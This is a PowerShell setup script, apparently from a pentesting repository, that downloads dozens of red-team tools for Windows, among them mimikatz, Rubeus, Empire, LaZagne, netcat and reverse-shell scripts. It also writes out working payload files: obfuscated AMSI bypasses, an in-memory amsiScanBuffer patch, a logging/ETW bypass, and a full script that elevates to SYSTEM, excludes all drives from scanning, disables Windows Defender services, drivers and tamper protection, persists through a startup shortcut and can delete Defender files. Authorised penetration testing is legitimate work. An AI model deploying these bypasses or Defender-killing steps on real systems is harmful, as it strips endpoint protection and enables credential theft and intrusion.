<#
Author: Hacker101 (@raj77in)
License: BSD 3-Clause
Required Dependencies: None
Download some very good RedTeaming/Pentesting tools for windows.
#>
param (
    [Parameter(Mandatory = $false)]
    [switch]$Huge,

    [Parameter(Mandatory = $false)]
    [switch]$Build
)

$hugefiles = @{
    "GhostPack"         = "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/archive/refs/heads/master.zip";
    "sharphound"        = "https://github.com/BloodHoundAD/SharpHound/releases/latest/download/SharpHound-v1.0.3.zip";
    "powersploit"       = "https://github.com/PowerShellMafia/PowerSploit/archive/refs/heads/master.zip";
    "sysinternals"      = "https://download.sysinternals.com/files/SysinternalsSuite.zip";
    "peas"              = "https://github.com/carlospolop/PEASS-ng/archive/refs/heads/master.zip";
    "InviShell"         = "https://github.com/OmerYa/Invisi-Shell/archive/refs/heads/master.zip";
    "BloodHoundAD"      = "https://github.com/BloodHoundAD/BloodHound/releases/latest/download/BloodHound-win32-x64.zip";
    "PentestingTools"   = "https://github.com/theyoge/AD-Pentesting-Tools/archive/refs/heads/main.zip";
    "SharpCollection"   = "https://github.com/Flangvik/SharpCollection/archive/refs/heads/master.zip";
    "Empire"            = "https://github.com/BC-SECURITY/Empire/archive/refs/heads/main.zip";
    "PowerSharpPack"    = "https://github.com/S3cur3Th1sSh1t/PowerSharpPack/archive/refs/heads/master.zip";
    "HeidiSQL-Portable" = "https://www.heidisql.com/downloads/releases/HeidiSQL_12.5_64_Portable.zip";
}

$zipurls = @{
    "mimikatz"          = "https://github.com/gentilkiwi/mimikatz/releases/latest/download//mimikatz_trunk.zip";
    "DefenderCheck"     = "https://github.com/matterpreter/DefenderCheck/archive/refs/heads/master.zip";
    "PowerUpSQL"        = "https://github.com/NetSPI/PowerUpSQL/archive/refs/heads/master.zip";
    "ADModule"          = "https://github.com/samratashok/ADModule/archive/refs/heads/master.zip";
    "kekeo"             = "https://github.com/gentilkiwi/kekeo/releases/latest/download/kekeo.zip";
    "Privesc-1"         = "https://github.com/i0n0n/Privesc-1/archive/refs/heads/master.zip";
    "NetCease"          = "https://github.com/p0w3rsh3ll/NetCease/archive/refs/heads/master.zip";
    "AssemblyLoader"    = "https://github.com/KINGSABRI/AssemblyLoader/archive/refs/heads/main.zip";
    "BeRoot"            = "https://github.com/AlessandroZ/BeRoot/releases/latest/download/beRoot.zip";
    "ASRepRoast"        = "https://github.com/HarmJ0y/ASREPRoast/archive/refs/heads/master.zip";
    "BetterSafetyKatz"  = "https://github.com/Flangvik/BetterSafetyKatz/archive/refs/heads/master.zip";
    "Certify"           = "https://github.com/GhostPack/Certify/archive/refs/heads/main.zip";
    "DAMP"              = "https://github.com/HarmJ0y/DAMP/archive/refs/heads/master.zip";
    "Deploy-Deception"  = "https://github.com/samratashok/Deploy-Deception/archive/refs/heads/master.zip";
    "Nishang"           = "https://github.com/samratashok/nishang/archive/refs/heads/master.zip";
    "MS-RPRN"           = "https://github.com/leechristensen/SpoolSample/archive/refs/heads/master.zip";
    "RACE"              = "https://github.com/samratashok/RACE/archive/refs/heads/master.zip";
    ## Others
    "ConfuserEx"        = "https://github.com/mkaring/ConfuserEx/archive/refs/heads/master.zip";
    "NetLoader"         = "https://github.com/Flangvik/NetLoader/archive/refs/heads/master.zip";
    "pstools"           = "https://download.sysinternals.com/files/PSTools.zip";
    "WinPTY"            = "https://github.com/rprichard/winpty/archive/refs/heads/master.zip";
    "NCat"              = "https://nmap.org/dist/ncat-portable-5.59BETA1.zip";
    "Invoke-TheHash"    = "https://github.com/Kevin-Robertson/Invoke-TheHash/archive/refs/heads/master.zip";
    "Dumpert"           = "https://github.com/outflanknl/Dumpert/archive/refs/heads/master.zip";
    "confuserex-bin"    = "https://github.com/mkaring/ConfuserEx/releases/latest/download/ConfuserEx.zip"
    "hoaxshell"         = "https://github.com/t3l3machus/hoaxshell/archive/refs/heads/main.zip";
    "AdmPwd.PS"         = "https://github.com/GreyCorbel/admpwd/archive/refs/heads/master.zip";
    "DSInternals"       = "https://github.com/MichaelGrafnetter/DSInternals/archive/refs/heads/master.zip";
    "DSInternals_v4.12" = "https://github.com/MichaelGrafnetter/DSInternals/releases/download/v4.12/DSInternals_v4.12.zip";
    "Kerberoast"        = "https://github.com/nidem/kerberoast/archive/refs/heads/master.zip";
    "PowerMAD"          = "https://github.com/Kevin-Robertson/Powermad/archive/refs/heads/master.zip";
    "AccessChk.zip"     = "https://download.sysinternals.com/files/AccessChk.zip";
    "SharpKatz"         = "https://github.com/b4rtik/SharpKatz/archive/refs/heads/master.zip";
    "LAPSToolkit"       = "https://github.com/leoloobeek/LAPSToolkit/archive/refs/heads/master.zip";
    "GoldenGMSA"        = "https://github.com/Semperis/GoldenGMSA/archive/refs/heads/main.zip";
    "MailSniper"        = "https://github.com/dafthack/MailSniper/archive/refs/heads/master.zip";
    "PetitPotam"        = "https://github.com/topotam/PetitPotam/archive/refs/heads/main.zip";
    "PyPyKatz"          = "https://github.com/skelsec/pypykatz/archive/refs/heads/master.zip";
    "SharpWMI"          = "https://github.com/GhostPack/SharpWMI/archive/refs/heads/master.zip";
    "Whisker"           = "https://github.com/eladshamir/Whisker/archive/refs/heads/main.zip";
    "Lsass-Shtinkering" = "https://github.com/deepinstinct/Lsass-Shtinkering/archive/refs/heads/main.zip";
    "lsassy"            = "https://github.com/Hackndo/lsassy/archive/refs/heads/master.zip";
    "neo4j"             = "https://go.neo4j.com/download-thanks.html?edition=community&release=5.12.0&flavour=winzip&_ga=2.43505445.1890909614.1697130153-1548790462.1697130153";
    "ADRecon"           = "https://github.com/adrecon/ADRecon/archive/refs/heads/master.zip";
    "WDACTools"         = "https://github.com/mattifestation/WDACTools/archive/refs/heads/master.zip";
}

$others = @{
    # "sysinternals.pdf"  = "https://docs.microsoft.com/en-us/sysinternals/opbuildpdf/toc.pdf?branch=live";
    "winpeas.exe"                         = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe";
    "winpeas_ofs.exe"                     = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe";
    "winpeas64_ofs.exe"                   = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64_ofs.exe";
    "AmsiTrigger64.exe"                   = "https://github.com/RythmStick/AMSITrigger/releases/latest/download/AmsiTrigger_x64.exe";
    "Invoke-AmsiBypass.ps1"               = "https://raw.githubusercontent.com/samratashok/nishang/master/Bypass/Invoke-AmsiBypass.ps1";
    "AmsiBypass.md"                       = "https://raw.githubusercontent.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell/master/README.md";
    "winPEASAny.exe"                      = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe";
    "sharphoud.exe"                       = "https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors/SharpHound.exe";
    "sharphoud.ps1"                       = "https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors/SharpHound.ps1";
    "PowerUp.ps1"                         = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1";
    "Harmjoy-PowerUp.ps1"                 = "https://raw.githubusercontent.com/HarmJ0y/PowerUp/master/PowerUp.ps1";
    "PowerView.ps1"                       = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1";
    "ADACLScan.ps1"                       = "https://raw.githubusercontent.com/canix1/ADACLScanner/master/ADACLScan.ps1";
    "PrivescCheck.ps1"                    = "https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1";
    "Find-PSRemotingLocalAdminAccess.ps1" = "https://pastebin.com/raw/szWajhfS";
    "Find-WMILocalAdminAccess.ps1"        = "https://raw.githubusercontent.com/admin0987654321/admin1/master/Find-WMILocalAdminAccess.ps1";
    "hfs.exe"                             = "https://github.com/rejetto/hfs2/releases/download/v2.4-rc06/hfs.exe";
    "Invoke-SDPropagator.ps1"             = "https://raw.githubusercontent.com/theyoge/AD-Pentesting-Tools/main/Invoke-SDPropagator.ps1";
    "powercat.ps1"                        = "https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1";
    "Invoke-ConPtyShell.ps1"              = "https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1";
    "mini-reverse.ps1"                    = "https://gist.githubusercontent.com/Serizao/6a63f35715a8219be6b97da3e51567e7/raw/f4283f758fb720c2fe263b8f7696b896c9984fcf/mini-reverse.ps1";
    "LaZagne.exe"                         = "https://github.com/AlessandroZ/LaZagne/releases/latest/download/LaZagne.exe";
    "ActiveDirectoryAttacks.md"           = 'https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md';
    "OpenSSL"                             = "https://slproweb.com/download/Win64OpenSSL-3_1_2.exe";
    "nc.exe"                              = "https://gitlab.com/kalilinux/packages/windows-binaries/-/raw/kali/master/nc.exe";
    "adconnect.ps1"                       = "https://gist.githubusercontent.com/xpn/0dc393e944d8733e3c63023968583545/raw/d45633c954ee3d40be1bff82648750f516cd3b80/azuread_decrypt_msol.ps1";
    "adPEAS.ps1"                          = "https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS-Light.ps1";
    "Active Directory Attack.md"          = "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md";
    "PowerView-3.0-tricks.ps1"            = "https://gist.githubusercontent.com/HarmJ0y/184f9822b195c52dd50c379ed3117993/raw/e5e30c942adb2347917563ef0dafa7054882535a/PowerView-3.0-tricks.ps1";
}

$copyfiles = @(
    "Nishang\nishang-master\Utility\Invoke-Encode.ps1";
    "Nishang\nishang-master\Gather\Invoke-Mimikatz.ps1";
    "Nishang\nishang-master\Shells\Invoke-PowerShellTcp.ps1";
    "Nishang\nishang-master\Shells\Invoke-PowerShellTcpOneLine.ps1";
    "Nishang\nishang-master\Backdoors\Set-RemotePSRemoting.ps1";
    "Nishang\nishang-master\Backdoors\Set-RemoteWMI.ps1";
    "Nishang\nishang-master\ActiveDirectory\Set-DCShadowPermissions.ps1";
    "GhostPack\Ghostpack-CompiledBinaries-master\Rubeus.exe";
    "GhostPack\Ghostpack-CompiledBinaries-master\SafetyKatz.exe";
    "GhostPack\Ghostpack-CompiledBinaries-master\SharpWMI.exe";
    "PentestingTools\AD-Pentesting-Tools-main\Set-ADACL.ps1";
)

if (Test-Path -Path Tools) {
    Write-Host "Folder already exists"
}
else {
    New-Item -ItemType Directory Tools
}
if (Test-Path -Path .\Tools\zipfiles) {
    Write-Host "Folder already exists"
}
else {
    New-Item -ItemType Directory Tools/zipfiles
}

Set-Location Tools

if ( -Not (Test-Path -Path .\Tools\zipfiles) ) {

    Copy-Item ..\tools.ico .
    $ico = $PWD.Path + "\tools.ico";
    Write-Host "$ico"
    @"

    [.ShellClassInfo]
    IconResource=$ico,0
    ConfirmFileOp = 0
    DefaultDropEffect = 1

"@ | Out-File -FilePath desktop.ini
    Set-ItemProperty desktop.ini -Name Attributes -Value "ReadOnly,System,Hidden"
    Set-ItemProperty $ico -Name Attributes -Value "ReadOnly,System,Hidden"

    # The Icon I want is 127K so not adding it online. Its in seperate file 
    # $b64 = ''
    # $filename = $ico
    # $bytes = [Convert]::FromBase64String($b64)
    # [IO.File]::WriteAllBytes($filename, $bytes)


    attrib.exe +R +S $PWD.Path
}

if ($Huge) {
    Foreach ($i in $hugefiles.GetEnumerator() ) {
        Write-Host "Downloading ZIP file $($i.Name)"
        Invoke-WebRequest -Uri $i.Value -OutFile "$($i.Name).zip"
        Write-Host "Extracting file $($i.Name)"
        Expand-Archive -Force "$($i.Name).zip" -DestinationPath $i.Name
        Move-Item "$($i.Name).zip" zipfiles/
    }    
}

Foreach ($i in $zipurls.GetEnumerator() ) {
    Write-Host "Downloading ZIP file $($i.Name)"
    Invoke-WebRequest -Uri $i.Value -OutFile "$($i.Name).zip"
    Write-Host "Extracting file $($i.Name)"
    Expand-Archive -Force "$($i.Name).zip" -DestinationPath $i.Name
    Move-Item "$($i.Name).zip" zipfiles/
}

Foreach ($i in $others.GetEnumerator() ) {
    Write-Host "Downloading file $($i.Name)"
    Invoke-WebRequest -Uri $i.Value -OutFile $i.Name
}
# Download Sysinternals Suite documentation
# Set-Location ..

@"
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
"@ | Out-File -FilePath amsibypass.txt

@'
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
'@ | Out-File -FilePath amsibypass2.txt

@"
[Reflection.Assembly]::"l`o`AdwIThPa`Rti`AlnamE"(('S'+'ystem'+'.C'+'ore'))."g`E`TTYPE"(('Sys'+'tem.Di'+'agno'+'stics.Event'+'i'+'ng.EventProv'+'i'+'der'))."gET`FI`eLd"(('m'+'_'+'enabled'),('NonP'+'ubl'+'ic'+',Instance'))."seTVa`l`Ue"([Ref]."a`sSem`BlY"."gE`T`TyPE"(('Sys'+'tem'+'.Mana'+'ge'+'ment.Aut'+'o'+'mation.Tracing.'+'PSEtwLo'+'g'+'Pro'+'vi'+'der'))."gEtFIe`Ld"(('e'+'tw'+'Provid'+'er'),('N'+'o'+'nPu'+'b'+'lic,Static'))."gE`Tva`lUe"($null),0)
"@ | Out-File -FilePath sbloggingbypass.txt

@'
$ZQCUW = @"
using System;
using System.Runtime.InteropServices;
public class ZQCUW {
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string
procName);
[DllImport("kernel32")]
public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr
dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $ZQCUW
$BBWHVWQ =
[ZQCUW]::LoadLibrary("$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&#97;&#109;&#115
;&#105;&#46;&#100;&#108;&#108;'))")
$XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ,
"$([systeM.neT.webUtility]::HtMldECoDE('&#65;&#109;&#115;&#105;&#83;&#99;&#97
;&#110;&#66;&#117;&#102;&#102;&#101;&#114;'))")
$p = 0
[ZQCUW]::VirtualProtect($XPYMWR, [uint32]5, 0x40, [ref]$p)
$TLML = "0xB8"
$PURX = "0x57"
$YNWL = "0x00"
$RTGX = "0x07"
$XVON = "0x80"
$WRUD = "0xC3"
$KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)
[System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)
'@ | Out-File -FilePath amsibypass-dotnet.txt

@'
# Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
# Set-MpPreference -DisableIOAVProtection $true
# Set-MpPreference -DisableRealtimeMonitoring $true
# Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend

if(-Not $($(whoami) -eq "nt authority\system")) {
    $IsSystem = $false

    # Elevate to admin (needed when called after reboot)
    if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
        Write-Host "    [i] Elevate to Administrator"
        $CommandLine = "-ExecutionPolicy Bypass `"" + $MyInvocation.MyCommand.Path + "`" " + $MyInvocation.UnboundArguments
        Start-Process -FilePath PowerShell.exe -Verb Runas -ArgumentList $CommandLine
        Exit
    }

    # Elevate to SYSTEM if psexec is available
    $psexec_path = $(Get-Command PsExec -ErrorAction 'ignore').Source 
    if($psexec_path) {
        Write-Host "    [i] Elevate to SYSTEM"
        $CommandLine = " -i -s powershell.exe -ExecutionPolicy Bypass `"" + $MyInvocation.MyCommand.Path + "`" " + $MyInvocation.UnboundArguments 
        Start-Process -WindowStyle Hidden -FilePath $psexec_path -ArgumentList $CommandLine
        exit
    } else {
        Write-Host "    [i] PsExec not found, will continue as Administrator"
    }

} else {
    $IsSystem = $true
}
67..90|foreach-object{
    $drive = [char]$_
    Add-MpPreference -ExclusionPath "$($drive):\" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "$($drive):\*" -ErrorAction SilentlyContinue
}

Write-Host "    [+] Disable scanning engines (Set-MpPreference)"

Set-MpPreference -DisableArchiveScanning 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableBehaviorMonitoring 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableIntrusionPreventionSystem 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableIOAVProtection 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableRemovableDriveScanning 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableBlockAtFirstSeen 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableScanningNetworkFiles 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableScriptScanning 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableRealtimeMonitoring 1 -ErrorAction SilentlyContinue

Write-Host "    [+] Set default actions to Allow (Set-MpPreference)"

Set-MpPreference -LowThreatDefaultAction Allow -ErrorAction SilentlyContinue
Set-MpPreference -ModerateThreatDefaultAction Allow -ErrorAction SilentlyContinue
Set-MpPreference -HighThreatDefaultAction Allow -ErrorAction SilentlyContinue
$need_reboot = $false

# WdNisSvc Network Inspection Service 
# WinDefend Antivirus Service
# Sense : Advanced Protection Service

$svc_list = @("WdNisSvc", "WinDefend", "Sense")
foreach($svc in $svc_list) {
    if($(Test-Path "HKLM:\SYSTEM\CurrentControlSet\Services\$svc")) {
        if( $(Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$svc").Start -eq 4) {
            Write-Host "        [i] Service $svc already disabled"
        } else {
            Write-Host "        [i] Disable service $svc (next reboot)"
            Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$svc" -Name Start -Value 4
            $need_reboot = $true
        }
    } else {
        Write-Host "        [i] Service $svc already deleted"
    }
}

Write-Host "    [+] Disable drivers"

# WdnisDrv : Network Inspection System Driver
# wdfilter : Mini-Filter Driver
# wdboot : Boot Driver

$drv_list = @("WdnisDrv", "wdfilter", "wdboot")
foreach($drv in $drv_list) {
    if($(Test-Path "HKLM:\SYSTEM\CurrentControlSet\Services\$drv")) {
        if( $(Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$drv").Start -eq 4) {
            Write-Host "        [i] Driver $drv already disabled"
        } else {
            Write-Host "        [i] Disable driver $drv (next reboot)"
            Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$drv" -Name Start -Value 4
            $need_reboot = $true
        }
    } else {
        Write-Host "        [i] Driver $drv already deleted"
    }
}

# Check if service running or not
if($(GET-Service -Name WinDefend).Status -eq "Running") {   
    Write-Host "    [+] WinDefend Service still running (reboot required)"
    $need_reboot = $true
} else {
    Write-Host "    [+] WinDefend Service not running"
}
$link_reboot = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\disable-defender.lnk"
Remove-Item -Force "$link_reboot" -ErrorAction 'ignore' # Remove the link (only execute once after reboot)

if($need_reboot) {
    Write-Host "    [+] This script will be started again after reboot." -BackgroundColor DarkRed -ForegroundColor White

    $powershell_path = '"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"'
    $cmdargs = "-ExecutionPolicy Bypass `"" + $MyInvocation.MyCommand.Path + "`" " + $MyInvocation.UnboundArguments

    $res = New-Item $(Split-Path -Path $link_reboot -Parent) -ItemType Directory -Force
    $WshShell = New-Object -comObject WScript.Shell
    $shortcut = $WshShell.CreateShortcut($link_reboot)
    $shortcut.TargetPath = $powershell_path
    $shortcut.Arguments = $cmdargs
    $shortcut.WorkingDirectory = "$(Split-Path -Path $PSScriptRoot -Parent)"
    $shortcut.Save()
} else {
    if($IsSystem) {

        # Configure the Defender registry to disable it (and the TamperProtection)
        # editing HKLM:\SOFTWARE\Microsoft\Windows Defender\ requires to be SYSTEM

        Write-Host "    [+] Disable all functionnalities with registry keys (SYSTEM privilege)"

        # Cloud-delivered protection:
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" -Name SpyNetReporting -Value 0
        # Automatic Sample submission
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" -Name SubmitSamplesConsent -Value 0
        # Tamper protection
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name TamperProtection -Value 4

        # Disable in registry
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1

    } else {
        Write-Host "    [W] (Optional) Cannot configure registry (not SYSTEM)"
    }


    if($MyInvocation.UnboundArguments -And $($MyInvocation.UnboundArguments.tolower().Contains("-delete"))) {

        # Delete Defender files

        function Delete-Show-Error {
            $path_exists = Test-Path $args[0]
            if($path_exists) {
                Remove-Item -Recurse -Force -Path $args[0]
            } else {
                Write-Host "    [i] $($args[0]) already deleted"
            }
        }

        Write-Host ""
        Write-Host "[+] Delete Windows Defender (files, services, drivers)"

        # Delete files
        Delete-Show-Error "C:\ProgramData\Windows\Windows Defender\"
        Delete-Show-Error "C:\ProgramData\Windows\Windows Defender Advanced Threat Protection\"

        # Delete drivers
        Delete-Show-Error "C:\Windows\System32\drivers\wd\"

        # Delete service registry entries
        foreach($svc in $svc_list) {
            Delete-Show-Error "HKLM:\SYSTEM\CurrentControlSet\Services\$svc"
        }

        # Delete drivers registry entries
        foreach($drv in $drv_list) {
            Delete-Show-Error "HKLM:\SYSTEM\CurrentControlSet\Services\$drv"
        }
    }
}
Write-Host "Script Finished" -foregroundcolor Yellow
'@ | Out-File -FilePath disable_defender.ps1

Foreach ($i in $copyfiles.GetEnumerator()) {
    Write-Host "Copying File $i"
    Copy-Item $i .
}

# Powershell modules from powershell gallery
# Save-Module -Name PowerSploit -Path tools -Repository PSGallery

if ($Build) {
    ## Build all solutions
    Write-Host "choco install dotnet-7.0-sdk-3xx visualstudio2015Community"
    dotnet.exe dev-certs https --trust

    # There are few ways to do this : msbuild project.sln /p:Configuration=Release
    # other option is with devenv -> devenv project.sln  /Build "Release|x64"
    # and finally that seemed to work consistently dotnet build -c configuration
    # dotnet tool install -g upgrade-assistant
    # Download .NET developer packs from https://dotnet.microsoft.com/en-us/download/visual-studio-sdks?cid=msbuild-developerpacks
    $build = $(Get-ChildItem .\*.sln -Recurse | ForEach-Object { "$_" })

    Foreach ($i in $build.GetEnumerator()) {
        Write-Host "Building solution $i"
        dotnet.exe build --use-current-runtime true --force  --disable-build-servers --self-contained true $i
    }
}

Write-Host "For Colors in winpeas in windows - REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1"
# Push-Location
# Set-Location HKCU:
# New-Item -Path HKCU:Console -Name VirtualTerminalLevel
# Set-Item -Path HKCU:Console\VirtualTerminalLevel -Value "1"
# Pop_Location

New-ItemProperty -Path HKCU:Console -Name VirtualTerminalLevel -Value "1" -Type DWORD

Set-Location ..
